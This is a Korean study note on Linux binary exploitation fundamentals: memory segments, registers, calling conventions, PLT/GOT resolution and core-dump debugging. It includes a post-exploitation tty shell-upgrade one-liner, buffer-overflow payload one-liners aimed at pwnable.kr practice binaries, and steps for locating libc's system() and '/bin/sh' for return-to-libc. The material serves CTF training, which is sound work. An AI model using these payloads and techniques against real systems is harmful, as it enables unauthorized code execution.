# 공격 툴
[[Package - Pwntools]]
[[GDB계열]]
[[one_gadget]]

# 공격 기법
[[Shellcode]]
[[SBO]]
[[RAO]]
[[RTL]]
[[ROP]]
[[GOT Overwrite]]
[[OOB]]
[[FSB]]
[[Hook Overwrite]]
[[NOP sled]]


# 리눅스 공격 요소 & 기법
[[환경 변수]]


# 보호기법
[[Memory Mitigation - Canary]]
[[Memory Mitigation - NX]]
[[Memory Mitigation - ASLR]]
[[Memory Mitigation - RELRO]]
[[Memory Mitigation - PIE]]
[[Memory Mitigation - CFI]]

# tty를 이용한 쉘 업그레이드
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
쉘 따고 나서 상호작용에 용이하게 만듬



# 리눅스 프로세스의 메모리 구조
리눅스에서는 프로세스의 메모리를 크게 5가지의 **세그먼트(Segment)** 로 구분됨

|**세그먼트**|**역할**|**일반적인 권한**|**사용 예**|
|---|---|---|---|
|코드 세그먼트|실행 가능한 코드가 저장된 영역|읽기, 실행|main() 등의 함수 코드|
|데이터 세그먼트|초기화된 전역 변수 또는 상수가 위치하는 영역|읽기와 쓰기 또는 읽기 전용|초기화된 전역 변수, 전역 상수|
|BSS 세그먼트|초기화되지 않은 데이터가 위치하는 영역|읽기, 쓰기|초기화되지 않은 전역 변수|
|스택 세그먼트|임시 변수가 저장되는 영역|읽기, 쓰기|지역 변수, 함수의 인자 등|
|힙 세그먼트|실행중에 동적으로 사용되는 영역|읽기, 쓰기|malloc(), calloc() 등으로 할당 받은 메모리|

*섹션은 실행 파일 내에서 데이터를 구분하는 데 사용되며, 세그먼트는 실행 시 메모리에 데이터를 적재하는 방식을 정의*

### 코드 세그먼트(Code Segment)
실행 가능한 기계 코드가 위치하는 영역
텍스트 세그먼트(Text Segment)라고도 불림

프로그램이 동작하려면 코드를 실행할 수 있어야 하므로 읽기 권한 과 실행 권한 이 부여됨
반면 쓰기 권한이 있으면 공격자가 악의적인 코드를 삽입하기가 쉬워지므로, 대부분의 현대 운영체제는 이 세그먼트에 쓰기 권한을 제거함

### 데이터 세그먼트(Data Segment)
컴파일 시점에 값이 정해진 전역 변수 및 전역 상수들이 위치
CPU가 이 세그먼트의 데이터를 읽을 수 있어야 하므로, 읽기 권한이 부여

- data 세그먼트
쓰기가 가능한 세그먼트는 전역 변수와 같이 프로그램이 실행되면서 값이 변할 수 있는 데이터들이 위치

- rodata(read-only data) 세그먼트
쓰기가 불가능한 세그먼트에는 프로그램이 실행되면서 값이 변하면 안되는 데이터들이 위치
전역으로 선언된 상수

### BSS 세그먼트(BSS Segment, Block Started By Symbol Segment)
컴파일 시점에 값이 정해지지 않은 전역 변수가 위치하는 메모리 영역
개발자가 선언만 하고 초기화하지 않은 전역변수
이 세그먼트의 메모리 영역은 프로그램이 시작될 때, 모두 0으로 값이 초기화됨(C 코드를 작성할 때, 초기화되지 않은 전역 변수의 값은 0이 됨)
읽기 권한 및 쓰기 권한이 부여


## 스택 세그먼트(Stack Segment)
함수의 인자나 지역 변수와 같은 임시 변수들이 실행 중에 여기에 저장
어떤 프로세스가 실행될 때, 이 프로세스가 얼마 만큼의 스택 프레임을 사용하게 될 지를 미리 계산하는 것은 일반적으로 불가능하기 때문에,
운영체제는 프로세스를 시작할 때 작은 크기의 스택 세그먼트를 먼저 할당해주고, 부족해 질 때마다 이를 확장해줌
스택에 대해서 ‘아래로 자란다' 라는 표현을 종종 사용하는데, 이는 스택이 확장될 때, 기존 주소보다 낮은 주소로 확장되기 때문
읽기 와 쓰기 권한 이 부여


### 힙 세그먼트(Heap Segment)
스택과 마찬가지로 실행중에 동적으로 할당될 수 있음
택 세그먼트와 반대 방향으로 자람
읽기와 쓰기 권한이 부여


# 어셈블리어 기본 명령어
|명령 코드|   |
|---|---|
|데이터 이동(Data Transfer)|`mov`, `lea`|
|산술 연산(Arithmetic)|`inc`, `dec`, `add`, `sub`|
|논리 연산(Logical)|`and`, `or`, `xor`, `not`|
|비교(Comparison)|`cmp`, `test`|
|분기(Branch)|`jmp`, `je`, `jg`|
|스택(Stack)|`push`, `pop`|
|프로시져(Procedure)|`call`, `ret`, `leave`|
|시스템 콜(System call)|`syscall`|

- pop eax
1. mov eax, esp
2. add esp, 4

- push eax
1. sub esp,4
2. mov esp, eax

- leave
3. mov  esp, ebp
4. pop ebp

- ret
5. pop eip
6. jmp eip

# 레지스터
- RAX - 'Accumulator Register'
주로 함수의 반환 값과 관련하여 사용되며, 산술 연산에도 사용
    
- RBX - 'Base Register'
주로 데이터 세그먼트에 대한 포인터로 사용
callee-saved register로, 함수가 이를 사용할 경우 원래 값으로 복원해야 함
    
- RCX - 'Counter Register'
루프, 시프트 연산에 사용되며, 명령어의 반복 횟수를 정하는 데 사용
    
- RDX - 'Data Register'
입출력 연산 및 나눗셈 연산 등에 사용
RAX와 함께 더 큰 데이터 타입을 처리할 때 종종 사용
    
- RDI - 'Destination Index'
주로 문자열이나 배열을 가리키는 데 사용되며, 함수의 첫 번째 인자로도 사용
    
- RSI - 'Source Index'
주로 문자열이나 배열을 가리키는 데 사용되며, 함수의 두 번째 인자로도 사용

- RBP (Base Pointer)
스택 프레임의 베이스 주소를 가리키는데 사용
함수의 스택 프레임 내에서 지역 변수와 함수 매개변수의 위치를 찾는 데 도움을 줌

- RSP (Stack Pointer) - 현재 스택의 탑(top)을 가리킴
즉, 가장 최근에 스택에 푸시된 위치를 가리킴

- R8 to R15 - 추가적인 범용 레지스터로, x86_64 아키텍처에서 도입됨
함수 매개변수 전달과 일반적인 목적으로 사용

# 메모리 피연산자
|메모리 피연산자|   |
|---|---|
|QWORD PTR [0x8048000]|0x8048000의 데이터를 8바이트만큼 참조|
|DWORD PTR [0x8048000]|0x8048000의 데이터를 4바이트만큼 참조|
|WORD PTR [rax]|rax가 가르키는 주소에서 데이터를 2바이트 만큼 참조|



# 크기 단위
- bit
1 or 0

- byte
아스키코드 하나를 나타낼 수 있음(=글자 하나 크기)
0x00 ~ 0xFF

- word
~~아키텍처에 따라 유동적으로 변함
아키텍처마다 다르지만, 일반적으로 32비트 컴퓨터이면 32비트
64비트 컴퓨터이면 word가 64비트가 됨
주소의 크기와 동일~~

인텔의 경우에는 새로운 아키텍처와 호환되지 않을 수 있음을 우려하여 기존에 사용하던 WORD의 크기(2바이트)를 그대로 유지하고, 
DWORD(Double Word, 32bit)와 QWORD(Quad Word, 64bit)자료형을 추가로 만들었음


# 쉘과 커널
직역하면, 쉘은 껍질, 커널은 호두 속 내용물
셸(Shell)이란 운영체제에 명령을 내리기 위해 사용되는 사용자의 인터페이스
커널(Kernel)은 운영 체제의 핵심 부분으로, 하드웨어와 직접적으로 통신하며 시스템 자원과 프로세스를 관리

커널은 시스템의 핵심적인 관리와 통제를 담당하는 반면, 쉘은 사용자와 시스템 간의 상호 작용을 중개하는 역할
커널은 대부분의 운영 체제에서 하나만 존재하지만, 쉘은 여러 종류와 인스턴스가 동시에 존재할 수 있음


# 시스템 콜
운영체제는 연결된 모든 하드웨어 및 소프트웨어에 접근할 수 있으며, 이들을 제어함
해킹으로부터 이 막강한 권한을 보호하기 위해 커널 모드와 유저 모드로 권한을 나눔

- 커널 모드
운영체제가 전체 시스템을 제어하기 위해 시스템 소프트웨어에 부여하는 권한
파일시스템, 입력/출력, 네트워크 통신, 메모리 관리 등 모든 저수준의 작업은 사용자 모르게 커널 모드에서 진행
커널 모드에서는 시스템의 모든 부분을 제어할 수 있기 때문에, 해커가 커널 모드까지 진입하게 되면 시스템은 거의 무방비 상태가 됨

- 유저 모드
운영체제가 사용자에게 부여하는 권한
리눅스에서 루트 권한으로 사용자를 추가하고, 패키지를 내려 받는 행위
유저 모드에서는 해킹이 발생해도, 해커가 유저 모드의 권한까지 밖에 획득하지 못하기 때문에 해커로 부터 커널의 막강한 권한을 보호할 수 있음

-  시스템 콜(system call, syscall)
유저 모드에서 커널 모드의 시스템 소프트웨어에게 어떤 동작을 요청하기 위해 사용

![[Pasted image 20231024220518.png]]

x64아키텍처에서는 시스템콜을 위해 `syscall` 명령어가 있음



# SFP 과 RET
- SFP
함수 a에서 b를 호출한 뒤 b 함수가 종료된 후 a 함수로 되돌아갔을때의 a 함수가 사용하던 스택 위치를 복구할 수 있도록 저장해놓은 공간
- RET
되돌아갔을때 a 함수의 코드가 마저 실행될 수 있도록 a 함수 코드 주소를 저장

```
Local Variables ...       <-- 상위 함수의 스택 프레임
-----------------
Saved Frame Pointer (SFP) <-- 이전 함수의 프레임 포인터
-----------------
Return Address (RET)      <-- 함수가 종료된 후 돌아갈 주소
-----------------
Local Variables ...       <-- 현재 함수의 스택 프레임
```


# FD
파일 서술자, FIle Descriptor
유닉스 계열의 운영체제에서 파일에 접근하는 소프트웨어에 제공하는 가상의 접근 제어자
유닉스 계열의 운영체제에서 파일에 접근하는 소프트웨어에 제공하는 가상의 접근 제어자

서술자 각각은 번호로 구별되는데, 
일반적으로 0번은 일반 입력(Standard Input, STDIN), 
1번은 일반 출력(Standard Output, STDOUT), 
2번은 일반 오류(Standard Error, STDERR)에 할당되어 있으며, 
이들은 프로세스를 터미널과 연결해줌

프로세스가 생성된 이후, 위의 open같은 함수를 통해 어떤 파일과 프로세스를 연결하려고 하면, 기본으로 할당된 2번 이후의 번호를 새로운 fd에 차례로 할당해줌
프로세스는 그 fd를 이용하여 파일에 접근할 수 있음


# ELF
대부분의 운영체제는 실행 가능한 파일의 형식을 규정하고 있음
윈도우의 [PE](https://en.wikipedia.org/wiki/Portable_Executable), 리눅스의 [ELF](https://en.wikipedia.org/wiki/Executable)가 대표적인 예
ELF(Executable and Linkable Format)는 크게 헤더와 코드 그리고 기타 데이터로 구성되어 있는데, 
헤더에는 실행에 필요한 여러 정보가 적혀 있고, 코드에는 CPU가 이해할 수 있는 기계어 코드가 적혀있음


# Calling Convention
함수 호출 규약
함수의 호출 및 반환에 대한 약속

- x86 함수 호출 규약

|   |   |   |   |   |
|---|---|---|---|---|
|**함수호출규약**|**사용 컴파일러**|**인자 전달 방식**|**스택 정리**|**적용**|
|stdcall|MSVC|Stack|Callee|WINAPI|
|cdecl|GCC, MSVC|Stack|Caller|일반 함수|
|fastcall|MSVC|ECX, EDX|Callee|최적화된 함수|
|thiscall|MSVC|ECX(인스턴스), Stack(인자)|Callee|클래스의 함수|

- x86-64 함수 호출 규약

|   |   |   |   |   |
|---|---|---|---|---|
|**함수호출규약**|**사용 컴파일러**|**인자 전달 방식**|**스택 정리**|**적용**|
|MS ABI|MSVC|RCX, RDX, R8, R9|Caller|일반 함수, Windows Syscall|
|System ABI|GCC|RDI, RSI, RDX, RCX, R8, R9, XMM0–7|Caller|일반 함수|

여기서 스택 정리란,
함수 호출 규약에서 "스택 정리"는 함수 호출이 완료된 후에 호출자(caller) 또는 피호출자(callee)에 의해 스택에서 매개변수들이 제거되는 과정을 의미



# 코어파일 분석
```sh
$ ./raoInput: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[1] 1828520 segmentation fault (core dumped) ./rao
```
일반적으로 Segmentation fault는 프로그램이 잘못된 메모리 주소에 접근했다는 의미이며, 프로그램에 버그가 발생했다는 신호
뒤의 (core dumped)는 코어파일(core)을 생성했다는 것으로, 프로그램이 비정상 종료됐을 때, 디버깅을 돕기 위해 운영체제가 생성해주는 것
해당파일은 디버깅에 용이하게 사용

Ubuntu 20.04 버전 이상은 기본적으로 `/var/lib/apport/coredump` 디렉토리에 코어 파일을 생성

만약 생성되지 않았다면 코어파일의 크기가 너무 큰 것 
`$ ulimit -c unlimited` 로 해제할 수 있음

```
$ gdb rao -c core.1828876
...
Could not check ASLR: Couldn't get personality
Core was generated by `./rao'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000000000400729 in main ()
...
pwndbg>
```

```sh
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x400729 <main+65>    ret    <0x4141414141414141>
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7fffc86322f8 ◂— 'AAAAAAAA'
01:0008│     0x7fffc8632300 ◂— 0x0
02:0010│     0x7fffc8632308 —▸ 0x4006e8 (main) ◂— push rbp
03:0018│     0x7fffc8632310 ◂— 0x100000000
04:0020│     0x7fffc8632318 —▸ 0x7fffc8632408 —▸ 0x7fffc86326f0 ◂— 0x434c006f61722f2e /* './rao' */
05:0028│     0x7fffc8632320 ◂— 0x0
06:0030│     0x7fffc8632328 ◂— 0x14b87e10e2771087
07:0038│     0x7fffc8632330 —▸ 0x7fffc8632408 —▸ 0x7fffc86326f0 ◂— 0x434c006f61722f2e /* './rao' */
```
예를들어 위와 같은 상황에서 프로그램이 `main`함수에서 반환하려고 하는데,
스택 최상단에 저장된 값이 입력값의 일부인 `0x4141414141414141('AAAAAAAA')`라는 것을 알 수 있음
이는 실행 가능한 메모리의 주소가 아니므로 세그먼테이션 폴트가 발생한 것


# 세그먼트 레지스터(segment registers)
x86 아키텍처에서 사용되는 특별한 목적의 레지스터로, 메모리 세그멘테이션을 통해 프로세스의 메모리에 접근하는 데 사용
각 세그먼트 레지스터는 메모리의 다른 세그먼트에 대한 기준(base) 주소를 저장
세그멘테이션은 메모리를 분리된 블록(세그먼트)으로 나누어 관리하는 방법으로, 효율적인 메모리 보호와 관리를 가능하게 함

- `cs` (Code Segment): 현재 실행 중인 코드 세그먼트의 베이스 주소를 가리킴
- `ds` (Data Segment): 일반 데이터 세그먼트의 베이스 주소를 가리킴
- `es` (Extra Segment): 추가 데이터 세그먼트로 사용될 수 있는 베이스 주소를 가리킴
- `fs`, `gs`: 추가적인 데이터 세그먼트로 사용되며, 특정 운영체제들에서는 특별한 용도로 사용. 예를 들어, 많은 Windows 시스템에서 `fs`는 Thread Local Storage(TLS)와 같은 특정 데이터 구조체에 대한 접근을 제공함
- `ss` (Stack Segment): 스택 데이터 세그먼트의 베이스 주소를 가리킴


# 바이너리 분석
- `file [binary]`
아키텍처 및 컴파일 옵션 확인

- `checksec [binary]`
보호기법 확인


# 링크
링크(Link)는 많은 프로그래밍 언어에서 컴파일의 마지막 단계
프로그램에서 어떤 라이브러리의 함수를 사용한다면, 호출된 함수와 실제 라이브러리의 함수가 링크 과정에서 연결

오브젝트 파일은 실행 가능한 형식을 갖추고 있지만, 라이브러리 함수들의 정의가 어디 있는지 알지 못하므로 실행은 불가능
`puts`를 사용한 오브젝트 파일에서 `puts`의 선언이 stdio.h에 있어서 심볼로는 기록되어 있지만, 심볼에 대한 자세한 내용은 하나도 기록되어 있지 않음 
심볼과 관련된 정보들을 찾아서 최종 실행 파일에 기록하는 것이 링크 과정에서 하는 일 중 하나

```sh
$ gcc -c hello-world.c -o hello-world.o
$ readelf -s hello-world.o | grep puts 
	11: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND puts
```

완전히 컴파일하면, libc에서 `puts` 의 정의를 찾아 연결한 것을 확인할 수 있음

```sh
$ gcc -o hello-world hello-world.c
$ readelf -s hello-world | grep puts
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
$ ldd hello-world
        linux-vdso.so.1 (0x00007ffec3995000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fee37831000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fee37e24000)
```

libc를 같이 컴파일하지 않았음에도 libc에서 해당 심볼을 탐색한 것은, libc가 있는 `/lib/x86_64-linux-gnu/`가 표준 라이브러리 경로에 포함되어 있기 때문
gcc는 소스 코드를 컴파일할 때 표준 라이브러리의 라이브러리 파일들을 모두 탐색
```sh
$ ld --verbose | grep SEARCH_DIR | tr -s ' ;' '\n'
SEARCH_DIR("=/usr/local/lib/x86_64-linux-gnu")
SEARCH_DIR("=/lib/x86_64-linux-gnu")
SEARCH_DIR("=/usr/lib/x86_64-linux-gnu")
SEARCH_DIR("=/usr/lib/x86_64-linux-gnu64")
SEARCH_DIR("=/usr/local/lib64")
SEARCH_DIR("=/lib64")
SEARCH_DIR("=/usr/lib64")
SEARCH_DIR("=/usr/local/lib")
SEARCH_DIR("=/lib")
SEARCH_DIR("=/usr/lib")
SEARCH_DIR("=/usr/x86_64-linux-gnu/lib64")
SEARCH_DIR("=/usr/x86_64-linux-gnu/lib")
```


# 정적 링크 vs 동적 링크
- 컴파일 방법
```sh
$ gcc -o static hello-world.c -static
$ gcc -o dynamic hello-world.c -no-pie
```

- 용량
용량을 ls로 비교해보면 `static` 이 `dynamic` 보다 50배 가까이 더 많은 용량을 차지하는 것을 확인할 수 있음
```sh
$ ls -lh ./static ./dynamic
-rwxrwxr-x 1 dreamhack dreamhack 16K May 22 02:01 ./dynamic
-rwxrwxr-x 1 dreamhack dreamhack 880K May 22 02:01 ./static
```

- 호출 방법
`static` 에서는 `puts` 가 있는 `0x40c140` 을 직접 호출
반면, `dynamic` 에서는 `puts` 의 plt주소인 `0x401040` 을 호출
plt는 이 과정에 사용되는 테이블

static
```
main:
  push   rbp
  mov    rbp,rsp
  lea    rax,[rip+0x96880] # 0x498004
  mov    rdi,rax
  call   0x40c140 <puts>
  mov    eax,0x0
  pop    rbp
  ret
```

dynamic
```
main: 
 push   rbp
 mov    rbp,rsp
 lea    rdi,[rip+0xebf] # 0x402004
 mov    rdi,rax
 call   0x401040 <puts@plt>
 mov    eax,0x0
 pop    rbp
 ret
```



# PLT & GOT
Procedure Linkage Table
Global Offset Table
라이브러리에서 동적 링크된 심볼의 주소를 찾을 때 사용하는 테이블

바이너리가 실행되면 ASLR에 의해 라이브러리가 임의의 주소에 매핑됨
이 상태에서 라이브러리 함수를 호출하면, 함수의 이름을 바탕으로 라이브러리에서 심볼들을 탐색하고, 
해당 함수의 정의를 발견하면 그 주소로 실행 흐름을 옮기게  
이 전 과정을 통틀어 runtime resolve라고 함
그런데 만약 반복적으로 호출되는 함수의 정의를 매번 탐색해야 한다면 비효율적임
그래서 ELF는 GOT라는 테이블을 두고, resolve된 함수의 주소를 해당 테이블에 저장
그리고 나중에 다시 해당 함수를 호출하면 저장된 주소를 꺼내서 사용

컴파일 후 실행한 직후 `puts` 의 GOT 엔트리인 `0x404018` 에는 아직 `puts` 의 주소를 찾기 전이므로, 함수 주소 대신 .plt 섹션 어딘가의 주소인 `0x401030` 이 적혀있음
```sh
$ gdb ./got
pwndbg> entry
pwndbg> got
GOT protection: Partial RELRO | GOT functions: 1
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64

pwndbg> plt
Section .plt 0x401020-0x401040:
No symbols found in section .plt
pwndbg>
```

`main()` 에서 `puts@plt` 를 호출하는 지점에 중단점을 설정하고, 내부로 따라가 보면, PLT에서는 먼저 `puts` 의 GOT 엔트리에 쓰인 값인 `0x401030` 으로 실행 흐름을 옮김
실행 흐름을 따라가면 `_dl_runtime_resolve_fxsave` 가 호출될 것임을 알 수 있음
```sh
pwndbg> b *main+18
pwndbg> c
...
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
   0x40113e <main+8>     lea    rax, [rip + 0xebf]
   0x401145 <main+15>    mov    rdi, rax
 ► 0x401148 <main+18>    call   puts@plt                      <puts@plt>
        s: 0x402004 ◂— "Resolving address of 'puts'."
...
pwndbg> si
...
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x401040       <puts@plt>                        endbr64
   0x401044       <puts@plt+4>                      bnd jmp qword ptr [rip + 0x2fcd]     <0x401030>
    ↓
   0x401030                                         endbr64
   0x401034                                         push   0
   0x401039                                         bnd jmp 0x401020                     <0x401020>
    ↓
   0x401020                                         push   qword ptr [rip + 0x2fe2]      <_GLOBAL_OFFSET_TABLE_+8>
   0x401026                                         bnd jmp qword ptr [rip + 0x2fe3]     <_dl_runtime_resolve_fxsave>
    ↓
   0x7ffff7fd8be0 <_dl_runtime_resolve_fxsave>      endbr64
   0x7ffff7fd8be4 <_dl_runtime_resolve_fxsave+4>    push   rbx
   0x7ffff7fd8be5 <_dl_runtime_resolve_fxsave+5>    mov    rbx, rsp
   0x7ffff7fd8be8 <_dl_runtime_resolve_fxsave+8>    and    rsp, 0xfffffffffffffff0
...
```

이 함수에서 `puts` 의 주소가 구해지고, GOT 엔트리에 주소를 씀

`puts@plt` 를 두 번째로 호출할 때는 `puts` 의 GOT 엔트리에 실제 `puts` 의 주소인 `0x7ffff7e02ed0` 가 쓰여있어서 바로 `puts` 가 실행
```sh
pwndbg> b *main+33
pwndbg> c
...
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
   0x401148 <main+18>    call   puts@plt                      <puts@plt>

   0x40114d <main+23>    lea    rax, [rip + 0xecd]
   0x401154 <main+30>    mov    rdi, rax
 ► 0x401157 <main+33>    call   puts@plt                      <puts@plt>
        s: 0x402021 ◂— 'Get address from GOT'
...
pwndbg> si
...
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x401040       <puts@plt>      endbr64
   0x401044       <puts@plt+4>    bnd jmp qword ptr [rip + 0x2fcd]     <puts>
    ↓
   0x7ffff7e02ed0 <puts>          endbr64
   0x7ffff7e02ed4 <puts+4>        push   r14
   0x7ffff7e02ed6 <puts+6>        push   r13
   0x7ffff7e02ed8 <puts+8>        push   r12
   0x7ffff7e02eda <puts+10>       mov    r12, rdi
   0x7ffff7e02edd <puts+13>       push   rbp
   0x7ffff7e02ede <puts+14>       push   rbx
   0x7ffff7e02edf <puts+15>       sub    rsp, 0x10
   0x7ffff7e02ee3 <puts+19>       call   *ABS*+0xa8720@plt                <*ABS*+0xa8720@plt>
...
```

시스템 해커의 관점에서 보면 PLT에서 GOT를 참조하여 실행 흐름을 옮길 때, GOT의 값을 검증하지 않는다는 보안상의 약점이 있음




# x64 stack alignment
Ubuntu 18.04 버전 이상부터는 효율 문제 때문에 `do_system()`에 `movaps`라는 인스트럭션이 추가되었음
이 인스트럭션 때문에 스택 정렬을 지키지 않으면 Segmentation Fault가 뜸
Linux 64 [ABI](https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf)( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 함



# `python -c` 을 이용한 exploit

```bash
./bof `python -c "print 'A'*52+'\xbe\xba\xfe\xca'"`
(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | ./bof
(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000

./col `python -c "print '\xcc\xce\xc5\x06'+'\xc8\xce\xc5\x06'*4"`
```




# 함수, 변수 주소 찾기

`system` 함수, `“/bin/sh”` 문자열은 libc 파일에 정의되어 있으므로, 주어진 libc 파일로부터 이들의 오프셋을 얻을 수 있음

1. 리눅스 명령어 사용

```sh
$ readelf -s libc-2.27.so | grep " system@"
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

system 함수 오프셋 = 0x4f550
```

```sh
$ strings -tx libc-2.27.so | grep "/bin/sh"
 1b3e1a /bin/sh

"/bin/sh" 오프셋 = 0x1b3e1a
```

2. pwntools 사용
```python
libc = ELF('./libc-2.27.so')  
libc.symbols["함수명"]
next(libc.search(b'/bin/sh')
```

3. GDB 사용
메모리 적재된 후의 값을 검색함
```sh
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
libc.so.6       0x7ffff7dd8698 0x68732f6e69622f /* '/bin/sh' */
```
